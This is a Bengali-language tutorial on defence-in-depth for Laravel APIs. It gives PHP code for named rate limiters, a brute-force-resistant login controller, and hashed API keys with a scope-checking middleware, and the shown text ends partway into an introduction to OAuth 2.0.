# 🛡️ Laravel API Security - Defense in Layers

> বাংলা ভাষায় সম্পূর্ণ গাইড | Technical terms, class names, methods, config keys, HTTP headers এবং status code গুলো English এ রাখা হয়েছে।

---

## 📋 সূচিপত্র

- [Defense in Layers কি?](#defense-in-layers-কি)
- [১০টি Security Layer - এক নজরে](#১০টি-security-layer---এক-নজরে)
- [1. Rate Limiting](#1-rate-limiting)
- [2. API Keys](#2-api-keys)
- [3. OAuth 2.0](#3-oauth-20)
- [4. JWT Validation](#4-jwt-validation)
- [5. Input Sanitization](#5-input-sanitization)
- [6. CORS Policy](#6-cors-policy)
- [7. mTLS (Mutual TLS)](#7-mtls-mutual-tls)
- [8. Request Signing](#8-request-signing)
- [9. IP Allowlisting](#9-ip-allowlisting)
- [10. Audit Logging](#10-audit-logging)
- [সব Layer একসাথে - Complete routes/api.php](#সব-layer-একসাথে---complete-routesapiphp)
- [Production Security Checklist](#production-security-checklist)
- [সাধারণ ভুল গুলো](#সাধারণ-ভুল-গুলো)
- [আরও পড়ুন](#আরও-পড়ুন)

---

## Defense in Layers কি?

### ❌ ভুল ধারণা

অনেক developer মনে করেন —

> "আমি `auth:sanctum` middleware লাগিয়ে দিয়েছি, আমার API এখন secure।"

এটা **সবচেয়ে বড় ভুল ধারণা**। API security কোনো একটা magic setting না যেটা on করলেই সব সমস্যার সমাধান হয়ে যায়।

### ✅ সঠিক ধারণা

API security হলো **অনেকগুলো স্তরের (layer) সুরক্ষা**, যেখানে —

- প্রতিটা layer আলাদা ধরনের attack ঠেকায়
- একটা layer fail করলেও পরের layer এখনও protection দেয়
- কোনো একটা layer কে "যথেষ্ট" ধরে নেওয়া যায় না

এই ধারণাটাকে বলা হয় **Defense in Depth** বা **Defense in Layers**।

### 🏢 Real-world Analogy — বিল্ডিং সিকিউরিটি

একটা corporate অফিস বিল্ডিং এর কথা চিন্তা করুন:

| বিল্ডিং এর সিকিউরিটি | API এর সিকিউরিটি | কি ঠেকায় |
|----------------------|-------------------|-----------|
| 🚧 গেটে দারোয়ান — একসাথে অনেক মানুষ ঢুকতে দেয় না | **Rate Limiting** | Brute-force, DoS |
| 🎫 Visitor Pass / ID Card | **API Keys** | অচেনা client |
| 🗝️ কোন floor এ যেতে পারবে সেই permission | **OAuth 2.0 Scopes** | অতিরিক্ত access |
| 🪪 ID Card টা আসল কিনা যাচাই | **JWT Validation** | জাল token |
| 🧳 ব্যাগ চেক করা | **Input Sanitization** | XSS, SQL Injection |
| 🚪 কোন গেট দিয়ে কে ঢুকতে পারবে | **CORS Policy** | অন্য website থেকে attack |
| 🤝 দুই পক্ষই একে অপরকে চেনে | **mTLS** | Man-in-the-middle |
| ✍️ কাগজে সিল-স্বাক্ষর | **Request Signing** | Tampering, Replay |
| 📍 শুধু নির্দিষ্ট এলাকার গাড়ি ঢুকবে | **IP Allowlisting** | অচেনা network |
| 📹 CCTV — কে কখন কি করলো | **Audit Logging** | Forensics, Compliance |

দারোয়ান একদিন ঘুমিয়ে পড়লেও CCTV চলছে, ID card check হচ্ছে, ব্যাগ চেক হচ্ছে।
**এটাই Defense in Layers।**

### 🎯 মনে রাখার মূল কথা

```
একটা Layer  = দুর্বল Security
দশটা Layer  = আসল Security

Attacker কে ১০টা layer ভাঙতে হবে,
আপনার শুধু ১টা layer কাজ করলেই তাকে আটকানো যাবে।
```

---

## ১০টি Security Layer - এক নজরে

| # | Layer | Purpose (কেন দরকার) | Laravel Implementation | Best Use Case |
|---|-------|---------------------|------------------------|---------------|
| 1 | **Rate Limiting** | অতিরিক্ত request আটকানো, brute-force ও DoS protection | `RateLimiter::for()` + `throttle` middleware | সব public API, বিশেষ করে `/login`, `/register`, `/otp` |
| 2 | **API Keys** | কোন application কল করছে সেটা শনাক্ত করা | Custom middleware + hashed key in DB (`X-API-Key` header) | Server-to-server, partner/third-party integration |
| 3 | **OAuth 2.0** | User এর হয়ে third-party app কে limited access দেওয়া | **Laravel Passport** (`scopes`, grant types) | Public API platform, "Login with X", mobile + third-party client |
| 4 | **JWT Validation** | Stateless token যাচাই করা (signature, `exp`, `iss`, `aud`) | `firebase/php-jwt` + custom Guard/Middleware | Microservices, external Identity Provider (Auth0/Keycloak/Cognito) |
| 5 | **Input Sanitization** | XSS, SQL Injection, Mass Assignment ঠেকানো | `FormRequest` validation + `SanitizeInput` middleware + Eloquent binding | ১০০% endpoint — কোনো exception নেই |
| 6 | **CORS Policy** | কোন origin browser থেকে API কল করতে পারবে তা নিয়ন্ত্রণ | `config/cors.php` + `HandleCors` middleware | Browser/SPA থেকে কল হওয়া API |
| 7 | **mTLS** | Client ও Server দুই পক্ষই certificate দিয়ে একে অপরকে verify করে | Nginx/Load Balancer এ TLS + Laravel middleware এ header verify | Banking, Payment gateway, internal microservice |
| 8 | **Request Signing** | Request body টেম্পার হয়নি ও replay হচ্ছে না তা নিশ্চিত করা | HMAC-SHA256 + timestamp + nonce middleware | Webhook, payment callback, high-value transaction |
| 9 | **IP Allowlisting** | শুধু নির্দিষ্ট IP/CIDR থেকে access দেওয়া | Custom middleware + `TrustProxies` + cached DB list | Admin panel, cron/internal endpoint, partner server |
| 10 | **Audit Logging** | কে, কখন, কি করেছে — সবকিছুর প্রমাণ রাখা | `audit_logs` table + Middleware + Model Observer + Log channel | Compliance (PCI-DSS/GDPR), incident investigation |

### 🔀 কোন Layer কোথায় বসে? (Request Flow)

```
Client Request
    │
    ▼
[ Load Balancer / Nginx ]  ← 7. mTLS, TLS termination
    │
    ▼
[ Global Middleware ]      ← 6. CORS, 9. IP Allowlist, Security Headers
    │
    ▼
[ Route Middleware ]       ← 1. Rate Limiting
    │
    ▼
[ Auth Middleware ]        ← 2. API Key, 3. OAuth, 4. JWT
    │
    ▼
[ Signature Middleware ]   ← 8. Request Signing
    │
    ▼
[ FormRequest ]            ← 5. Input Sanitization + Validation
    │
    ▼
[ Policy / Gate ]          ← Authorization (আলাদা গাইড আছে)
    │
    ▼
[ Controller → Service ]
    │
    ▼
[ Terminable Middleware ]  ← 10. Audit Logging
    │
    ▼
Response
```

---

## 1. Rate Limiting

### What is Rate Limiting?

**Rate Limiting** মানে হলো — একজন client (user বা IP) নির্দিষ্ট সময়ে সর্বোচ্চ কতগুলো request পাঠাতে পারবে সেটা নির্ধারণ করে দেওয়া।

সহজ কথায়:

> "তুমি ১ মিনিটে সর্বোচ্চ ৬০ বার আমাকে ডাকতে পারবে। এর বেশি ডাকলে আমি উত্তর দেবো না।"

Limit পার হয়ে গেলে Laravel automatically **HTTP 429 Too Many Requests** response ফেরত দেয়।

#### 🍽️ Analogy

রেস্টুরেন্টের বুফেতে লেখা থাকে "একবারে একটা প্লেট"। কেউ যদি একা ১০টা প্লেট নিয়ে যায়, বাকিদের জন্য খাবার থাকবে না। Rate Limiting ঠিক এই কাজটাই করে — **একজন যাতে পুরো সার্ভার দখল করে না ফেলে।**

### Why do we need it?

| সমস্যা | Rate Limiting ছাড়া কি হয় | Rate Limiting থাকলে |
|--------|---------------------------|---------------------|
| 🔓 **Brute-force protection** | Attacker `/login` এ সেকেন্ডে হাজারবার password চেষ্টা করে account ভেঙে ফেলে | ৫ বার ভুল করলেই ব্লক |
| 🚨 **Abuse prevention** | একজন user স্ক্রিপ্ট চালিয়ে সব data scrape করে নেয় | Scraping অসম্ভব হয়ে যায় |
| 💥 **DoS protection** | হাজার হাজার request এ server crash করে, সবার জন্য site down | Server স্বাভাবিক থাকে |
| 💰 **API resource protection** | প্রতি request এ SMS/Email/AI API খরচ হয় — bill হাজার ডলার হয়ে যায় | খরচ predictable থাকে |
| 🐢 **Excessive requests** | Database এ অতিরিক্ত load, সবার response slow | Fair usage নিশ্চিত হয় |

> ⚠️ **বাস্তব উদাহরণ:** `/api/send-otp` endpoint এ rate limit না থাকলে attacker একটা loop চালিয়ে হাজার হাজার SMS পাঠিয়ে দিতে পারে। SMS gateway এর bill আপনার ঘাড়ে পড়বে, আর ভুক্তভোগী user এর ফোনে spam যাবে।

### Laravel Best Practice

Laravel এ rate limiting এর **আধুনিক ও সঠিক উপায়** হলো — **Named Limiter** তৈরি করে সেটা `throttle` middleware দিয়ে route এ apply করা।

কেন Named Limiter ভালো?

- ✅ সব limit এক জায়গায় থাকে — maintain করা সহজ
- ✅ Per-user, per-IP, per-plan ভিন্ন logic লেখা যায়
- ✅ Custom 429 response দেওয়া যায়
- ✅ Route এ শুধু নাম লিখলেই হয়: `throttle:login`

#### ধাপ ১: Named Limiter তৈরি করা

**Laravel 11 / 12** এ `App\Providers\AppServiceProvider` এর `boot()` method এ লিখুন।
**Laravel 10 বা তার আগে** হলে একই কোড `App\Providers\RouteServiceProvider` এর `boot()` এ লিখুন।

```php
<?php
// app/Providers/AppServiceProvider.php   (Laravel 11/12)
// app/Providers/RouteServiceProvider.php (Laravel 10 বা আগে)

namespace App\Providers;

use App\Models\User;
use Illuminate\Cache\RateLimiting\Limit;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\ServiceProvider;

class AppServiceProvider extends ServiceProvider
{
    public function boot(): void
    {
        $this->configureRateLimiting();
    }

    protected function configureRateLimiting(): void
    {
        // ────────────────────────────────────────────────
        // 1) Login - সবচেয়ে কড়া limit (Brute-force protection)
        //    IP + email combination দিয়ে limit করা হচ্ছে
        // ────────────────────────────────────────────────
        RateLimiter::for('login', function (Request $request) {
            return Limit::perMinute(5)->by(
                $request->ip() . '|' . strtolower((string) $request->input('email'))
            )->response(function (Request $request, array $headers) {
                return response()->json([
                    'message'     => 'অনেকবার ভুল চেষ্টা করা হয়েছে। ১ মিনিট পর আবার চেষ্টা করুন।',
                    'retry_after' => $headers['Retry-After'] ?? 60,
                ], 429, $headers);
            });
        });

        // ────────────────────────────────────────────────
        // 2) General API - logged-in user হলে user id, না হলে IP
        // ────────────────────────────────────────────────
        RateLimiter::for('api', function (Request $request) {
            return $request->user()
                ? Limit::perMinute(120)->by('user:' . $request->user()->id)
                : Limit::perMinute(30)->by('ip:' . $request->ip());
        });

        // ────────────────────────────────────────────────
        // 3) Public endpoint - কোনো auth নেই, তাই শুধু IP
        // ────────────────────────────────────────────────
        RateLimiter::for('public', function (Request $request) {
            return Limit::perMinute(60)->by($request->ip());
        });

        // ────────────────────────────────────────────────
        // 4) OTP / SMS - টাকা খরচ হয়, তাই খুব কড়া
        //    একাধিক limit একসাথে return করা যায় (array)
        // ────────────────────────────────────────────────
        RateLimiter::for('otp', function (Request $request) {
            return [
                Limit::perMinute(1)->by($request->ip()),          // ১ মিনিটে ১ বার
                Limit::perDay(10)->by($request->input('phone')),  // দিনে ১০ বার
            ];
        });

        // ────────────────────────────────────────────────
        // 5) Subscription plan অনুযায়ী ভিন্ন limit
        // ────────────────────────────────────────────────
        RateLimiter::for('plan', function (Request $request) {
            $user = $request->user();

            if (! $user) {
                return Limit::perMinute(20)->by($request->ip());
            }

            return match ($user->plan) {
                'enterprise' => Limit::none(),                       // কোনো limit নেই
                'pro'        => Limit::perMinute(600)->by($user->id),
                default      => Limit::perMinute(60)->by($user->id), // free plan
            };
        });

        // ────────────────────────────────────────────────
        // 6) Heavy operation (report/export) - খুব কম limit
        // ────────────────────────────────────────────────
        RateLimiter::for('heavy', function (Request $request) {
            return Limit::perHour(10)->by(
                optional($request->user())->id ?: $request->ip()
            );
        });
    }
}
```

##### 🔍 কোডের ব্যাখ্যা

| অংশ | মানে |
|-----|------|
| `RateLimiter::for('login', ...)` | `login` নামে একটা limiter তৈরি হলো |
| `Limit::perMinute(5)` | ১ মিনিটে সর্বোচ্চ ৫ request |
| `->by($key)` | **কার** জন্য গোনা হবে — এই key ধরে counter রাখা হয় |
| `->response(...)` | Limit পার হলে কি response যাবে (custom JSON) |
| `Limit::none()` | কোনো limit নেই (unlimited) |
| `Limit::perDay(10)` | দিনে ১০ বার |
| array return | একাধিক limit একসাথে — যেকোনো একটা hit করলেই block |

> 💡 **`by()` কেন সবচেয়ে গুরুত্বপূর্ণ?**
> `by()` না দিলে Laravel পুরো route এর জন্য একটাই global counter রাখে — অর্থাৎ একজন user limit শেষ করলে **সব user** ব্লক হয়ে যাবে। সবসময় `by()` দিন।

#### ধাপ ২: Route এ Apply করা

```php
<?php
// routes/api.php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\Api\{AuthController, PostController, ReportController, OtpController};

// ── Public (কোনো auth নেই) ──────────────────────────
Route::middleware('throttle:public')->group(function () {
    Route::get('/posts',        [PostController::class, 'index']);
    Route::get('/posts/{post}', [PostController::class, 'show']);
});

// ── Auth endpoints (কড়া limit) ─────────────────────
Route::middleware('throttle:login')->post('/login',    [AuthController::class, 'login']);
Route::middleware('throttle:otp')->post('/send-otp',   [OtpController::class, 'send']);

// inline limit ও দেওয়া যায় → throttle:{maxAttempts},{decayMinutes}
Route::middleware('throttle:3,60')->post('/register',  [AuthController::class, 'register']);

// ── Authenticated API ───────────────────────────────
Route::middleware(['auth:sanctum', 'throttle:api'])->group(function () {
    Route::apiResource('posts', PostController::class)->except(['index', 'show']);

    // ভারী কাজের জন্য আলাদা কড়া limit (দুইটা throttle একসাথে চলতে পারে)
    Route::middleware('throttle:heavy')->post('/reports/export', [ReportController::class, 'export']);
});
```

#### ধাপ ৩: Global `api` Middleware Group এ Throttle যোগ করা

**Laravel 11 / 12** — `bootstrap/app.php`:

```php
<?php
// bootstrap/app.php

use Illuminate\Foundation\Application;
use Illuminate\Foundation\Configuration\Middleware;

return Application::configure(basePath: dirname(__DIR__))
    ->withRouting(
        api: __DIR__.'/../routes/api.php',
        apiPrefix: 'api',
    )
    ->withMiddleware(function (Middleware $middleware) {
        // সব API route এ default throttle
        $middleware->api(prepend: [
            'throttle:api',
        ]);
    })
    ->create();
```

**Laravel 10 বা আগে** — `app/Http/Kernel.php`:

```php
<?php
// app/Http/Kernel.php

protected $middlewareGroups = [
    'api' => [
        'throttle:api',
        \Illuminate\Routing\Middleware\SubstituteBindings::class,
    ],
];
```

#### ধাপ ৪: Login Controller এ অতিরিক্ত সুরক্ষা

Route level throttle এর পাশাপাশি Controller এ `RateLimiter` facade সরাসরি ব্যবহার করলে আরও নিখুঁত control পাওয়া যায় — **সফল login হলে counter clear করে দেওয়া যায়।**

```php
<?php
// app/Http/Controllers/Api/AuthController.php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Validation\ValidationException;

class AuthController extends Controller
{
    public function login(Request $request): JsonResponse
    {
        $credentials = $request->validate([
            'email'    => ['required', 'email'],
            'password' => ['required', 'string'],
        ]);

        $key = 'login:' . strtolower($credentials['email']) . '|' . $request->ip();

        // ১) আগে থেকেই limit পার হয়ে গেছে কিনা দেখি
        if (RateLimiter::tooManyAttempts($key, maxAttempts: 5)) {
            throw ValidationException::withMessages([
                'email' => 'অনেকবার চেষ্টা করা হয়েছে। '
                    . RateLimiter::availableIn($key) . ' সেকেন্ড পর আবার চেষ্টা করুন।',
            ])->status(429);
        }

        // ২) ভুল credential হলে counter বাড়াই
        if (! Auth::attempt($credentials)) {
            RateLimiter::hit($key, decaySeconds: 60);

            throw ValidationException::withMessages([
                'email' => 'ভুল email অথবা password.',
            ]);
        }

        // ৩) সফল হলে counter মুছে ফেলি (সৎ user শাস্তি পাবে না)
        RateLimiter::clear($key);

        $user = $request->user() ?? Auth::user();

        return response()->json([
            'token' => $user->createToken('api-token')->plainTextToken,
            'user'  => $user->only(['id', 'name', 'email']),
        ]);
    }
}
```

#### 📤 Response Headers

Rate limiting চালু থাকলে Laravel প্রতিটা response এ এই header গুলো পাঠায় — frontend developer রা এগুলো দেখে UI তে warning দেখাতে পারে:

```http
HTTP/1.1 200 OK
X-RateLimit-Limit: 60
X-RateLimit-Remaining: 47

--- limit পার হলে ---

HTTP/1.1 429 Too Many Requests
X-RateLimit-Limit: 60
X-RateLimit-Remaining: 0
Retry-After: 43
```

#### ⚙️ Production Configuration

```php
<?php
// config/cache.php — Rate limit counter কোথায় রাখা হবে

// ❌ 'file' driver — একাধিক server থাকলে কাজ করবে না
// ✅ 'redis' driver — সব server একই counter share করবে
```

```env
CACHE_STORE=redis
REDIS_HOST=127.0.0.1
REDIS_PORT=6379
```

> ⚠️ **খুব গুরুত্বপূর্ণ:** Load balancer এর পেছনে multiple server থাকলে `file` বা `array` cache driver ব্যবহার করলে rate limit ভেঙে যাবে — প্রতিটা server আলাদা counter রাখবে, ফলে attacker ৩ গুণ বেশি request পাঠাতে পারবে। **সবসময় Redis ব্যবহার করুন।**

#### 🧪 Test করা

```php
<?php
// tests/Feature/LoginRateLimitTest.php

use function Pest\Laravel\postJson;

it('blocks login after 5 failed attempts', function () {
    foreach (range(1, 5) as $i) {
        postJson('/api/login', [
            'email'    => 'test@example.com',
            'password' => 'wrong-password',
        ])->assertStatus(422);
    }

    // ৬ষ্ঠ বার → 429
    postJson('/api/login', [
        'email'    => 'test@example.com',
        'password' => 'wrong-password',
    ])->assertStatus(429);
});
```

#### ✅ Rate Limiting Checklist

- [ ] `/login`, `/register`, `/forgot-password`, `/otp` এ আলাদা কড়া limit আছে
- [ ] সব limiter এ `->by()` দেওয়া আছে
- [ ] Production এ `CACHE_STORE=redis`
- [ ] সফল login এ `RateLimiter::clear()` কল হচ্ছে
- [ ] 429 response এ friendly message + `Retry-After` আছে
- [ ] Proxy এর পেছনে থাকলে `TrustProxies` ঠিক আছে (নাহলে সবার IP একই দেখাবে!)

---

## 2. API Keys

### What is an API Key?

**API Key** হলো একটা লম্বা random string যেটা দিয়ে বোঝা যায় — **কোন application/system** আপনার API কল করছে।

```http
GET /api/v1/orders HTTP/1.1
Host: api.myshop.com
X-API-Key: sk_live_9f2c1a7b4e8d3f6a5c0b9e2d7a4f1c8b
```

#### 🔑 API Key vs User Token — পার্থক্য

| | API Key | User Token (Sanctum/JWT) |
|--|---------|--------------------------|
| উত্তর দেয় | "**কোন app** কল করছে?" | "**কোন user** কল করছে?" |
| জীবনকাল | দীর্ঘ (মাস/বছর) | ছোট (ঘন্টা/দিন) |
| কে ব্যবহার করে | Server, cron job, partner system | Browser, mobile app |
| উদাহরণ | Payment gateway, SMS gateway | Login করা user |

> 💡 API Key হলো **Identification** (তুমি কে), **Authentication নয়** পুরোপুরি। তাই API Key কখনো একা ব্যবহার করবেন না — সাথে IP allowlist, rate limit ও HTTPS অবশ্যই লাগবে।

### Why do we need it?

- 🏷️ **Client Identification** — কোন partner কত request পাঠাচ্ছে জানা যায়
- 📊 **Per-client Rate Limit & Quota** — প্রতিটা client এর আলাদা limit দেওয়া যায়
- 🔌 **Instant Revocation** — কোনো partner এর key leak হলে শুধু সেই key বন্ধ করে দিলেই হয়
- 💵 **Billing / Usage Tracking** — কে কত ব্যবহার করেছে হিসাব রাখা যায়
- 🚫 **Server-to-Server Auth** — যেখানে কোনো "user" নেই (cron, webhook), সেখানে এটাই একমাত্র উপায়

### Laravel Best Practice

#### 🚨 সবচেয়ে বড় নিয়ম: Key কখনো plain text এ Database এ রাখবেন না

Database leak হলে attacker সব key পেয়ে যাবে। Password এর মতোই API key **hash করে** রাখুন।

- Database এ রাখুন → `hash('sha256', $key)`
- User কে দেখান → **শুধু একবার**, তৈরির সময়
- খোঁজার সুবিধার জন্য → `prefix` আলাদা column এ রাখুন

#### ধাপ ১: Migration

```php
<?php
// database/migrations/2026_01_01_000000_create_api_keys_table.php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    public function up(): void
    {
        Schema::create('api_keys', function (Blueprint $table) {
            $table->id();
            $table->foreignId('user_id')->nullable()->constrained()->nullOnDelete();
            $table->string('name');                        // "Partner XYZ Production"
            $table->string('prefix', 12)->index();         // "sk_live_9f2c" — খোঁজার জন্য
            $table->string('key_hash', 64)->unique();      // sha256 hash — আসল key নয়
            $table->json('scopes')->nullable();            // ["orders:read","orders:write"]
            $table->json('allowed_ips')->nullable();       // ["103.230.107.50"]
            $table->unsignedInteger('rate_limit')->default(60); // per minute
            $table->unsignedBigInteger('usage_count')->default(0);
            $table->timestamp('last_used_at')->nullable();
            $table->string('last_used_ip', 45)->nullable();
            $table->timestamp('expires_at')->nullable();
            $table->timestamp('revoked_at')->nullable();
            $table->timestamps();
        });
    }

    public function down(): void
    {
        Schema::dropIfExists('api_keys');
    }
};
```

#### ধাপ ২: Model

```php
<?php
// app/Models/ApiKey.php

namespace App\Models;

use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Relations\BelongsTo;
use Illuminate\Support\Str;

class ApiKey extends Model
{
    protected $fillable = [
        'user_id', 'name', 'prefix', 'key_hash', 'scopes',
        'allowed_ips', 'rate_limit', 'expires_at', 'revoked_at',
    ];

    protected $casts = [
        'scopes'       => 'array',
        'allowed_ips'  => 'array',
        'last_used_at' => 'datetime',
        'expires_at'   => 'datetime',
        'revoked_at'   => 'datetime',
    ];

    // key_hash কখনো JSON response এ যাবে না
    protected $hidden = ['key_hash'];

    /**
     * নতুন key তৈরি করে। plain key শুধু এখানেই একবার পাওয়া যাবে।
     *
     * @return array{model: ApiKey, plain_key: string}
     */
    public static function generate(string $name, array $attributes = []): array
    {
        $plain  = 'sk_live_' . Str::random(48);

        $model = static::create(array_merge($attributes, [
            'name'     => $name,
            'prefix'   => substr($plain, 0, 12),
            'key_hash' => hash('sha256', $plain),
        ]));

        return ['model' => $model, 'plain_key' => $plain];
    }

    /** plain key থেকে ম্যাচিং active key খুঁজে বের করে */
    public static function findByPlainKey(string $plain): ?self
    {
        return static::query()
            ->active()
            ->where('key_hash', hash('sha256', $plain))
            ->first();
    }

    public function scopeActive(Builder $query): Builder
    {
        return $query
            ->whereNull('revoked_at')
            ->where(fn (Builder $q) => $q->whereNull('expires_at')->orWhere('expires_at', '>', now()));
    }

    public function hasScope(string $scope): bool
    {
        $scopes = $this->scopes ?? [];

        return in_array('*', $scopes, true) || in_array($scope, $scopes, true);
    }

    public function allowsIp(string $ip): bool
    {
        // allowed_ips খালি মানে সব IP allowed
        return empty($this->allowed_ips) || in_array($ip, $this->allowed_ips, true);
    }

    public function owner(): BelongsTo
    {
        return $this->belongsTo(User::class, 'user_id');
    }
}
```

#### ধাপ ৩: Middleware

```php
<?php
// app/Http/Middleware/AuthenticateApiKey.php

namespace App\Http\Middleware;

use App\Models\ApiKey;
use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Symfony\Component\HttpFoundation\Response;

class AuthenticateApiKey
{
    /**
     * Usage: ->middleware('api.key:orders:read')
     */
    public function handle(Request $request, Closure $next, ?string $scope = null): Response
    {
        $plain = $request->header('X-API-Key')
            ?? $request->bearerToken();   // Authorization: Bearer <key> ও support করি

        if (blank($plain)) {
            return $this->deny('API key required.', 401);
        }

        $apiKey = ApiKey::findByPlainKey($plain);

        if (! $apiKey) {
            Log::channel('security')->warning('Invalid API key used', [
                'prefix' => substr($plain, 0, 12),
                'ip'     => $request->ip(),
                'path'   => $request->path(),
            ]);

            return $this->deny('Invalid or expired API key.', 401);
        }

        if (! $apiKey->allowsIp($request->ip())) {
            Log::channel('security')->warning('API key used from unauthorized IP', [
                'api_key_id' => $apiKey->id,
                'ip'         => $request->ip(),
            ]);

            return $this->deny('This IP is not authorized for this API key.', 403);
        }

        if ($scope && ! $apiKey->hasScope($scope)) {
            return $this->deny("Missing required scope: {$scope}", 403);
        }

        // পরের middleware/controller এ ব্যবহার করার জন্য request এ রেখে দিলাম
        $request->attributes->set('api_key', $apiKey);

        // Usage tracking - queue তে দিলে request slow হবে না
        dispatch(function () use ($apiKey, $request) {
            $apiKey->forceFill([
                'usage_count'  => $apiKey->usage_count + 1,
                'last_used_at' => now(),
                'last_used_ip' => $request->ip(),
            ])->saveQuietly();
        })->afterResponse();

        return $next($request);
    }

    protected function deny(string $message, int $status): Response
    {
        return response()->json(['message' => $message], $status);
    }
}
```

#### ধাপ ৪: Middleware Register + Route

**Laravel 11 / 12** — `bootstrap/app.php`:

```php
->withMiddleware(function (Middleware $middleware) {
    $middleware->alias([
        'api.key' => \App\Http\Middleware\AuthenticateApiKey::class,
    ]);
})
```

**Laravel 10 বা আগে** — `app/Http/Kernel.php`:

```php
protected $middlewareAliases = [
    'api.key' => \App\Http\Middleware\AuthenticateApiKey::class,
];
```

```php
<?php
// routes/api.php

// Partner/Server-to-Server API
Route::prefix('v1/partner')->middleware(['api.key', 'throttle:api'])->group(function () {
    Route::get('/orders',       [PartnerOrderController::class, 'index'])
        ->middleware('api.key:orders:read');

    Route::post('/orders',      [PartnerOrderController::class, 'store'])
        ->middleware('api.key:orders:write');

    Route::post('/refunds',     [PartnerRefundController::class, 'store'])
        ->middleware('api.key:refunds:write');
});
```

#### ধাপ ৫: Per-Key Rate Limit

API Key এর নিজস্ব `rate_limit` column কে limiter এর সাথে যুক্ত করুন:

```php
<?php
// AppServiceProvider::configureRateLimiting()

RateLimiter::for('api-key', function (Request $request) {
    $apiKey = $request->attributes->get('api_key');

    return $apiKey
        ? Limit::perMinute($apiKey->rate_limit)->by('key:' . $apiKey->id)
        : Limit::perMinute(10)->by($request->ip());   // key নেই → খুব কম limit
});
```

```php
// throttle অবশ্যই api.key এর পরে বসবে, নাহলে $apiKey পাওয়া যাবে না
Route::middleware(['api.key', 'throttle:api-key'])->group(/* ... */);
```

#### ধাপ ৬: Key তৈরি করার Artisan Command

```php
<?php
// app/Console/Commands/CreateApiKey.php

namespace App\Console\Commands;

use App\Models\ApiKey;
use Illuminate\Console\Command;

class CreateApiKey extends Command
{
    protected $signature = 'api-key:create
                            {name : Key এর নাম, যেমন "Partner XYZ"}
                            {--scopes=* : যেমন orders:read orders:write}
                            {--ips=* : Allowed IP list}
                            {--rate=60 : Per minute limit}';

    protected $description = 'নতুন API key তৈরি করে';

    public function handle(): int
    {
        ['model' => $model, 'plain_key' => $plain] = ApiKey::generate(
            $this->argument('name'),
            [
                'scopes'      => $this->option('scopes') ?: ['*'],
                'allowed_ips' => $this->option('ips') ?: null,
                'rate_limit'  => (int) $this->option('rate'),
            ]
        );

        $this->info("API Key তৈরি হয়েছে (ID: {$model->id})");
        $this->warn('নিচের key টা এখনই কপি করে নিন — এটা আর কখনো দেখানো হবে না:');
        $this->line($plain);

        return self::SUCCESS;
    }
}
```

```bash
php artisan api-key:create "Partner XYZ" --scopes=orders:read --scopes=orders:write --ips=103.230.107.50 --rate=300
```

#### 🔒 API Key Security Rules

| নিয়ম | কেন |
|------|-----|
| ✅ Database এ **hash** রাখুন | DB leak হলেও key অকেজো |
| ✅ **HTTPS only** | HTTP তে key plain text এ যায়, যে কেউ পড়তে পারে |
| ✅ **Header** এ পাঠান, URL query তে নয় | URL server log, browser history, Referer header এ থেকে যায় |
| ✅ **Scopes** দিন | Read-only partner যেন delete করতে না পারে |
| ✅ **Expiry + Rotation** | ৯০ দিন পর পর key বদলান |
| ✅ `hash_equals()` / hash lookup ব্যবহার করুন | Timing attack প্রতিরোধ |
| ❌ Frontend JavaScript এ key রাখবেন না | Browser এ যা আছে, user ও দেখতে পায় |
| ❌ Git এ commit করবেন না | `.env` ব্যবহার করুন, `.gitignore` চেক করুন |

> ⚠️ **`X-API-Key` header টা কি নিরাপদ?** HTTPS এর ভেতরে header encrypted থাকে, তাই হ্যাঁ। কিন্তু `?api_key=xxx` এভাবে URL এ পাঠালে সেটা Nginx access log, CDN log, browser history — সব জায়গায় লেখা হয়ে যাবে। **কখনো URL এ key পাঠাবেন না।**

---

## 3. OAuth 2.0

### What is OAuth 2.0?

**OAuth 2.0** হলো একটা industry standard protocol যেটার মাধ্যমে একজন user তার **password না দিয়েই** একটা third-party application কে নিজের data তে **সীমিত access** দিতে পারে।

#### 🏨 Analogy — হোটেলের Key Card

আপনি হোটেলে উঠলে ম্যানেজার আপনাকে **মাস্টার চাবি** দেয় না। দেয় একটা **key card** যেটা —

- শুধু আপনার রুম খোলে (**scope**)
- চেক-আউট এর দিন কাজ করা বন্ধ করে দেয় (**expiry**)
- হারিয়ে গেলে ম্যানেজার সেটা বাতিল করে দিতে পারে (**revoke**)
- আপনার আসল পরিচয়পত্র কারো হাতে যায় না (**password shared হয় না**)

OAuth 2.0 ঠিক এই কাজটাই করে।

#### OAuth 2.0 এর চারটি চরিত্র

| চরিত্র | কে | উদাহরণ |
|--------|-----|--------|
| **Resource Owner** | User — যার data | আপনি |
| **Client** | যে app access চাইছে | কোনো Analytics app |
| **Authorization Server** | যে token দেয় | আপনার Laravel + Passport |
| **Resource Server** | যেখানে data আছে | আপনার Laravel API |

#### 🔄 Authorization Code Flow (সবচেয়ে বেশি ব্যবহৃত)

```
User          Third-party App        Your Laravel (Passport)
 │                  │                          │
 │  "Login with X"  │                          │
 ├─────────────────►│                          │
 │                  │  redirect → /oauth/authorize
 │                  ├─────────────────────────►│
 │◄─────────── "এই app কে অনুমতি দেবেন?" ──────┤
 │  [ Approve ]     │                          │
 ├──────────────────────────────────────────► │
 │                  │◄── redirect + auth code ─┤
 │                  │                          │
 │                  │  POST /oauth/token       │
 │                  │  (code + client_secret)  │
 │                  ├─────────────────────────►│
 │                  │◄── access_token ─────────┤
 │                  │                          │
 │                  │  GET /api/user           │
 │                  │  Authorization: Bearer   │
 │                  ├─────────────────────────►│
```

### Why do we need it?

- 🔐 **Password Sharing বন্ধ** — user তার password third-party app কে দেবে না
- 🎯 **Scope-based Limited Access** — app শুধু `read:profile` পেলো, `delete:account` পেলো না
- ⏳ **Expiry + Refresh Token** — token চুরি হলেও অল্প সময় পর অকেজো
